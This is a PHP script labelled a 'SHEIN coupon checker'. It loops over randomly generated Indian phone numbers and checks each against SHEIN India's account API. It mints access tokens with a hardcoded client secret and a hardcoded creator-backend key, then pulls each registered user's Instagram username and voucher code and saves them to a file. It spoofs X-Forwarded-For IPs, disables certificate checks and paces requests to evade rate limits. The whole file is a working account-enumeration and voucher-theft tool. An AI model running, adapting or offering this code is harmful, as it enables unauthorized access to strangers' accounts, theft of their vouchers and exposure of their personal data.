<?php
// File to save valid coupons
$validFile = getenv('USERPROFILE') . '/Desktop/Downloads/shein_valid.txt';

// Simple HTTP function without cURL
function httpCall($url, $data = null, $headers = [], $method = "GET") {
    $options = [
        'http' => [
            'method' => $method,
            'header' => implode("\r\n", $headers),
            'timeout' => 10,
            'ignore_errors' => true
        ],
        'ssl' => [
            'verify_peer' => false,
            'verify_peer_name' => false
        ]
    ];
    
    // For POST requests
    if (strtoupper($method) === "POST" && $data) {
        $options['http']['content'] = $data;
    }
    // For GET requests with data
    elseif ($data && strtoupper($method) === "GET") {
        $url .= (strpos($url, '?') === false ? '?' : '&') . http_build_query($data);
    }
    
    $context = stream_context_create($options);
    
    // Add default headers if none provided
    if (empty($headers)) {
        $ip = randIp();
        $options['http']['header'] = "X-Forwarded-For: $ip\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";
        $context = stream_context_create($options);
    }
    
    $result = @file_get_contents($url, false, $context);
    
    if ($result === false) {
        return "";
    }
    
    return $result;
}

function randIp() { 
    return rand(100,200) . "." . rand(10,250) . "." . rand(10,250) . "." . rand(1,250); 
}

function genDeviceId() { 
    return bin2hex(random_bytes(8)); 
}

function generateIndianNumber() {
    // Generate numbers starting with 8 or 9 only
    $prefix = (rand(0, 1) == 0) ? '8' : '9';
    
    // Generate remaining 9 digits
    $number = $prefix;
    for ($i = 0; $i < 9; $i++) {
        $number .= rand(0, 9);
    }
    
    return $number;
}

function checkNumber($number, &$triedNumbers) {
    if (in_array($number, $triedNumbers)) {
        return false;
    }
    
    $triedNumbers[] = $number;
    echo "Checking: $number\n";
    
    $ip = randIp(); 
    $adId = genDeviceId();
    
    // Step 1: Get access token
    $url = "https://api.sheinindia.in/uaas/jwt/token/client";
    $headers = [
        "Client_type: Android/29",
        "Accept: application/json",
        "Client_version: 1.0.8",
        "User-Agent: Android",
        "X-Tenant-Id: SHEIN",
        "Ad_id: $adId",
        "X-Tenant: B2C",
        "Content-Type: application/x-www-form-urlencoded",
        "X-Forwarded-For: $ip"
    ];
    
    $data = "grantType=client_credentials&clientName=trusted_client&clientSecret=secret";
    $res = httpCall($url, $data, $headers, "POST");
    
    if (empty($res)) {
        echo "Error: No response from API\n";
        return false;
    }
    
    $j = @json_decode($res, true);
    if ($j === null) {
        echo "Error: Invalid JSON response\n";
        return false;
    }
    
    $access_token = $j['access_token'] ?? null;
    
    if(!$access_token) {
        echo "Error generating token for $number\n";
        return false;
    }
    
    // Step 2: Check if number is registered
    $url = "https://api.sheinindia.in/uaas/accountCheck?client_type=Android%2F29&client_version=1.0.8";
    $headers = [
        "Authorization: Bearer $access_token",
        "Requestid: account_check",
        "X-Tenant: B2C",
        "Accept: application/json",
        "User-Agent: Android",
        "Client_type: Android/29",
        "Client_version: 1.0.8",
        "X-Tenant-Id: SHEIN",
        "Ad_id: $adId",
        "Content-Type: application/x-www-form-urlencoded",
        "X-Forwarded-For: $ip"
    ];
    
    $data = "mobileNumber=$number";
    $res = httpCall($url, $data, $headers, "POST");
    
    if (empty($res)) {
        echo "Error: No response from account check\n";
        return false;
    }
    
    $j = @json_decode($res, true);
    if ($j === null) {
        echo "Error: Invalid JSON from account check\n";
        return false;
    }
    
    if(isset($j['success']) && $j['success'] === false) {
        echo "Number $number is not registered\n";
        return false;
    }
    
    $encryptedId = $j['encryptedId'] ?? '';
    if(empty($encryptedId)) {
        echo "No encrypted ID for $number\n";
        return false;
    }
    
    // Step 3: Generate SHEIN token
    $payload = json_encode([
        "client_type" => "Android/29",
        "client_version" => "1.0.8",
        "gender" => "",
        "phone_number" => $number,
        "secret_key" => "3LFcKwBTXcsMzO5LaUbNYoyMSpt7M3RP5dW9ifWffzg",
        "user_id" => $encryptedId,
        "user_name" => ""
    ]);
    
    $headers = [
        "Accept: application/json",
        "User-Agent: Android",
        "Client_type: Android/29",
        "Client_version: 1.0.8",
        "X-Tenant-Id: SHEIN",
        "Ad_id: $adId",
        "Content-Type: application/json; charset=UTF-8",
        "X-Forwarded-For: $ip"
    ];
    
    $url = "https://shein-creator-backend-151437891745.asia-south1.run.app/api/v1/auth/generate-token";
    $res = httpCall($url, $payload, $headers, "POST");
    
    if (empty($res)) {
        echo "Error: No response from token generation\n";
        return false;
    }
    
    $j = @json_decode($res, true);
    if ($j === null) {
        echo "Error: Invalid JSON from token generation\n";
        return false;
    }
    
    if(empty($j['access_token'])) {
        echo "Error generating SHEIN token for $number\n";
        return false;
    }
    
    $sheinverse_access_token = $j['access_token'];
    
    // Step 4: Get user data and check for coupon
    $url = "https://shein-creator-backend-151437891745.asia-south1.run.app/api/v1/user";
    $headers = [
        "Host: shein-creator-backend-151437891745.asia-south1.run.app",
        "Authorization: Bearer " . $sheinverse_access_token,
        "User-Agent: Mozilla/5.0 (Linux; Android 15; SM-S938B Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/140.0.7339.207 Mobile Safari/537.36",
        "Accept: */*",
        "Origin: https://sheinverse.galleri5.com",
        "X-Requested-With: com.ril.shein",
        "Referer: https://sheinverse.galleri5.com/",
        "Content-Type: application/json",
        "X-Forwarded-For: $ip"
    ];
    
    $res = httpCall($url, "", $headers, "GET");
    
    if (empty($res)) {
        echo "Error: No response from user API\n";
        return false;
    }
    
    $decoded = @json_decode($res, true);
    if ($decoded === null) {
        echo "Error: Invalid JSON from user API\n";
        return false;
    }
    
    if (!isset($decoded['user_data']['instagram_data']['username'])) {
        echo "No valid data found for $number\n";
        return false;
    }
    
    $username = $decoded['user_data']['instagram_data']['username'] ?? 'N/A';
    $voucher = $decoded['user_data']['voucher_data']['voucher_code'] ?? 'N/A';
    $voucher_amount = $decoded['user_data']['voucher_data']['voucher_amount'] ?? 'N/A';
    $expiry_date = $decoded['user_data']['voucher_data']['expiry_date'] ?? '';
    $min_purchase_amount = $decoded['user_data']['voucher_data']['min_purchase_amount'] ?? '';
    
    // Check if voucher is valid (not N/A)
    if ($voucher !== 'N/A' && !empty($voucher) && $voucher !== '') {
        echo "\n✅ COUPON FOUND!\n";
        echo "Number: $number\n";
        echo "Instagram: $username\n";
        echo "Voucher Code: $voucher\n";
        echo "Amount: $voucher_amount\n";
        echo "Min Purchase: $min_purchase_amount\n";
        echo "Expiry Date: $expiry_date\n\n";
        
        // Save to file
        $data = "========================================\n";
        $data .= "Number: $number\n";
        $data .= "Instagram: $username\n";
        $data .= "Voucher Code: $voucher\n";
        $data .= "Amount: $voucher_amount\n";
        $data .= "Min Purchase: $min_purchase_amount\n";
        $data .= "Expiry Date: $expiry_date\n";
        $data .= "Found At: " . date('Y-m-d H:i:s') . "\n";
        $data .= "========================================\n\n";
        
        file_put_contents($GLOBALS['validFile'], $data, FILE_APPEND);
        return true;
    } else {
        echo "No coupon found for $number\n";
        return false;
    }
}

// Main script
function clearScreen() {
    if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
        system('cls');
    } else {
        system('clear');
    }
}

clearScreen();
echo "========================================\n";
echo "SHEIN COUPON CHECKER - NO cURL VERSION\n";
echo "========================================\n\n";
echo "Auto-generating Indian numbers (8 or 9 starting)\n";
echo "Saving valid coupons to: $validFile\n";
echo "Press Ctrl+C to stop\n\n";

// Create directory if it doesn't exist
$dir = dirname($validFile);
if (!is_dir($dir)) {
    mkdir($dir, 0777, true);
}

// Array to track tried numbers
$triedNumbers = [];
$foundCount = 0;
$checkedCount = 0;
$batchSize = 5;

while (true) {
    // Generate 5 numbers at once
    $numbers = [];
    for ($i = 0; $i < $batchSize; $i++) {
        $num = generateIndianNumber();
        // Ensure no duplicates
        while (in_array($num, $triedNumbers)) {
            $num = generateIndianNumber();
        }
        $numbers[] = $num;
    }
    
    // Display the batch
    echo "📱 Checking Batch: " . implode(" ", $numbers) . "\n";
    echo str_repeat("-", 50) . "\n";
    
    // Check each number
    foreach ($numbers as $number) {
        $checkedCount++;
        echo "\n[$checkedCount] ";
        
        if (checkNumber($number, $triedNumbers)) {
            $foundCount++;
            echo "✅ Valid coupon saved! (Total found: $foundCount)\n";
        }
        
        // Small delay to avoid rate limiting
        usleep(300000); // 0.3 seconds
    }
    
    echo "\n" . str_repeat("=", 50) . "\n";
    echo "📊 Stats: Checked: $checkedCount | Found: $foundCount\n";
    echo str_repeat("=", 50) . "\n\n";
    
    // Wait 1 second before next batch
    sleep(1);
    
    // Clear screen for next batch
    clearScreen();
    
    // Re-display header
    echo "========================================\n";
    echo "SHEIN COUPON CHECKER - NO cURL VERSION\n";
    echo "========================================\n\n";
    echo "Auto-generating Indian numbers (8 or 9 starting)\n";
    echo "Saving valid coupons to: $validFile\n";
    echo "Press Ctrl+C to stop\n\n";
    echo "📊 Total Checked: $checkedCount | Total Found: $foundCount\n\n";
}
?>
